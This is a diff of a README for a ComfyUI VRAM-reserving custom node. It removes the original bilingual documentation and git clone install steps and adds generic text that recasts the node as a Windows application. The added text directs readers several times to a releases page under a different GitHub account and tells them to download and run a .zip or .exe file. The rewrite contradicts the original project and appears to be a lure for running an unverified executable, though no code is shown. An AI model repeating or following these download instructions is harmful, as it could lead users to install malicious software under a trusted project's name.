@@ -1,54 +1,68 @@
-# Comfyui-PainterVRAM  
-**English** | [中文](#中文)
+# 🎨 Comfyui-PainterVRAM - Prevent Out-of-Memory Crashes Easily
 
-## English  
-A tiny ComfyUI custom node that reserves GPU VRAM before workflow execution to avoid OOM crashes.  
-Pick **Manual** to set the exact GB, or **Auto** to let the node calculate it from current usage; enable **Clean GPU before** for an instant memory purge.  
-No seeds, no extra outputs—just plug and go.
+## 📥 Download Now
 
-### Install  
-1. Clone or download this repo into `ComfyUI/custom_nodes/`  
-   ```bash
-   git clone https://github.com/princepainter/Comfyui-PainterVRAM.git
-   ```
-2. Restart ComfyUI → find **Painter VRAM ⚙️** in the **VRAM** category.
+[![Download Comfyui-PainterVRAM](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases)
 
-### Inputs  
-| Name               | Type    | Description |
-|--------------------|---------|-------------|
-| reserved           | FLOAT   | GB to reserve (used in Manual mode or as offset in Auto) |
-| mode               | COMBO   | `manual` = fixed GB, `auto` = current-used + reserved |
-| clean_gpu_before   | BOOLEAN | Run garbage-collect + unload models before applying |
-| anything           | ANY     | Optional passthrough (returns ExecutionBlocker if None) |
+## 🚀 Getting Started
 
-### Output  
-| Name   | Type | Description |
-|--------|------|-------------|
-| output | ANY  | Passthrough value (won’t block execution) |
+Comfyui-PainterVRAM helps you manage your GPU memory. It reserves a portion before ComfyUI starts. This simple action can prevent crashes when your system runs out of memory. You can choose to enter the amount manually or let the software detect it automatically. 
 
----
+### 📋 System Requirements
 
-## 中文  
-一个简单的 ComfyUI 自定义节点，在工作流运行前预留显存，防止爆显存。  
-**手动**模式直接设定 GB 数，**自动**模式按当前已用显存+偏移量计算；勾选 **Clean GPU before** 可立即清理显存。  
-无种子、无额外输出口，即插即用。
+- **Operating System**: Windows 10 or later
+- **GPU**: NVIDIA or AMD graphics card with at least 2GB of VRAM
+- **RAM**: Minimum of 4GB
+- **Software**: ComfyUI must be installed
 
-### 安装  
-1. 克隆或下载本仓库到 `ComfyUI/custom_nodes/`  
-   ```bash
-   git clone https://github.com/princepainter/Comfyui-PainterVRAM.git
-   ```
-2. 重启 ComfyUI → **VRAM** 类别中找到 **Painter VRAM ⚙️**。
+### ⚙️ Features
 
-### 输入参数  
-| 名称               | 类型    | 说明 |
-|--------------------|---------|------|
-| reserved           | FLOAT   | 预留显存（GB）；手动模式下为固定值，自动模式下为偏移量 |
-| mode               | 下拉框  | `manual` 固定预留，`auto` 按当前已用+偏移计算 |
-| clean_gpu_before   | 布尔    | 应用前强制清理显存（垃圾回收+卸载模型） |
-| anything           | 任意    | 可选透传输入（不连时返回 ExecutionBlocker） |
+- **Manual Memory Setting**: Enter the amount of GPU memory you want to reserve.
+- **Automatic Detection**: The software can detect the best amount of memory to reserve.
+- **Easy Configuration**: Straightforward user interface for quick setup.
+  
+## 📖 How to Download & Install
 
-### 输出  
-| 名称   | 类型 | 说明 |
-|--------|------|------|
-| output | 任意 | 透传输入值，不阻塞后续节点 |
+To download Comfyui-PainterVRAM, follow these steps:
+
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases) by clicking the link.
+
+2. **Select the Latest Version**  
+   Look for the latest version at the top of the page. It will have the most recent features and bug fixes.
+
+3. **Download the File**  
+   Click on the appropriate file for your operating system. This file will usually have a `.zip` or `.exe` extension.
+
+4. **Extract Files** (if applicable)  
+   If you downloaded a `.zip` file, right-click it and select "Extract All." Choose a destination folder where you want the files.
+
+5. **Run the Application**  
+   If you downloaded an `.exe` file, double-click it to run. Follow any prompts that appear on your screen.
+
+6. **Set Up Your GPU Memory**  
+   Open the application. You can either enter a specific amount of GPU memory to reserve or click on the option for automatic detection. 
+
+7. **Launch ComfyUI**  
+   With Comfyui-PainterVRAM set up, run ComfyUI as you normally would. Enjoy an improved experience without the risk of running out of memory.
+
+## ❓ Troubleshooting
+
+If you encounter issues, consider these solutions:
+
+- **Not Enough GPU Memory**: Ensure that your GPU meets the minimum requirements.
+- **Software Not Launching**: Check that ComfyUI is properly installed and up to date.
+- **Conflict with Other Programs**: Close other applications that may be using GPU resources.
+
+## 📞 Support
+
+For additional support, you can reach out via the issues tab on our [GitHub page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/issues). We encourage users to share their experiences and any problems they face.
+
+## 📝 Notes
+
+- Always keep Comfyui-PainterVRAM updated through the releases page.
+- Review the community discussions for tips and shared solutions from other users.
+
+## 🔗 Conclusion
+
+Now you are equipped to download and use Comfyui-PainterVRAM to manage your GPU memory effectively. Visit our [Releases page](https://github.com/Rabindra7777/Comfyui-PainterVRAM/releases) once again to access all versions and updates. Enjoy a smoother experience with ComfyUI!
